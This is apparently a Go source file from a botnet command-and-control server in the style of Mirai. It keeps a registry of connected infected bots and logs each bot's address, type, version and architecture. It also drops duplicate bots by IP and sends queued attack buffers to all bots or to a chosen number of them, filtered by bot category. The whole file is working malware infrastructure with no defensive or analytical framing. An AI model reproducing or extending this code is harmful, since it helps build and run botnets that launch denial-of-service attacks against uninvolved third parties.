package main

import (
	"fmt"
	"net"
	"sync"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid        int
	clients    map[int]*Bot
	addQueue   chan *Bot
	delQueue   chan *Bot
	atkQueue   chan *AttackSend
	totalCount chan int
	cntView    chan int
	mutex      sync.RWMutex
	ipMap      map[string]*Bot
}

func NewClientList() *ClientList {
	c := &ClientList{
		uid:        0,
		clients:    make(map[int]*Bot),
		addQueue:   make(chan *Bot, 128),
		delQueue:   make(chan *Bot, 128),
		atkQueue:   make(chan *AttackSend),
		totalCount: make(chan int, 64),
		cntView:    make(chan int),
		ipMap:      make(map[string]*Bot),
	}
	go c.worker()
	go c.fastCountWorker()
	return c
}

func (this *ClientList) Count() int {
	this.mutex.RLock()
	defer this.mutex.RUnlock()
	return len(this.clients)
}

func (this *ClientList) AddClient(c *Bot) {
	this.addQueue <- c
	fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;82mConnect \x1b[38;5;231m] \x1b[38;5;231mBot \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| \x1b[38;5;231mType \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;231m%s | Arch \x1b[38;5;231m: \x1b[38;5;231m%s\r\n", c.conn.RemoteAddr(), c.source, c.version, c.arch)
}

func (this *ClientList) DelClient(c *Bot) {
	this.delQueue <- c
	fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;196mDisconnect \x1b[38;5;231m] \x1b[38;5;231mBot \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| \x1b[38;5;231mType \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;231m%s | Arch \x1b[38;5;231m: \x1b[38;5;231m%s\r\n", c.conn.RemoteAddr(), c.source, c.version, c.arch)
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	count := 0
	for {
		select {
		case delta := <-this.totalCount:
			count += delta
		case <-this.cntView:
			this.cntView <- count
		}
	}
}

func (this *ClientList) worker() {
	for {
		select {
		case add := <-this.addQueue:
			remoteAddr := add.conn.RemoteAddr().String()
			ip, _, _ := net.SplitHostPort(remoteAddr)

			this.mutex.Lock()
			if config.AntiDuplicate {
				if oldBot, exists := this.ipMap[ip]; exists {
					fmt.Printf("\x1b[38;5;231m[ \x1b[38;5;231mDuplicated \x1b[38;5;231m] \x1b[38;5;231mBot \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| \x1b[38;5;231mType \x1b[38;5;231m: \x1b[38;5;231m%s \x1b[38;5;231m| Version \x1b[38;5;231m: \x1b[38;5;231m%s\r\n",
						oldBot.conn.RemoteAddr(), oldBot.source, oldBot.version)

					delete(this.clients, oldBot.uid)
					if this.ipMap[ip] == oldBot {
						delete(this.ipMap, ip)
					}
					this.totalCount <- -1
					go oldBot.conn.Close()
				}
			}

			this.uid++
			add.uid = this.uid
			this.clients[add.uid] = add
			this.ipMap[ip] = add
			this.mutex.Unlock()

			this.totalCount <- 1

		case del := <-this.delQueue:
			this.mutex.Lock()
			if _, exists := this.clients[del.uid]; !exists {
				this.mutex.Unlock()
				break
			}

			delete(this.clients, del.uid)

			remoteAddr := del.conn.RemoteAddr().String()
			ip, _, _ := net.SplitHostPort(remoteAddr)
			if currentBot, exists := this.ipMap[ip]; exists && currentBot.uid == del.uid {
				delete(this.ipMap, ip)
			}
			this.mutex.Unlock()

			this.totalCount <- -1

		case atk := <-this.atkQueue:
			this.mutex.RLock()
			var bots []*Bot
			if atk.count == -1 {
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						bots = append(bots, v)
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count >= atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						bots = append(bots, v)
						count++
					}
				}
			}
			this.mutex.RUnlock()

			for _, bot := range bots {
				bot.QueueBuf(atk.buf)
			}

		case <-this.cntView:
			this.cntView <- len(this.clients)
		}
	}
}
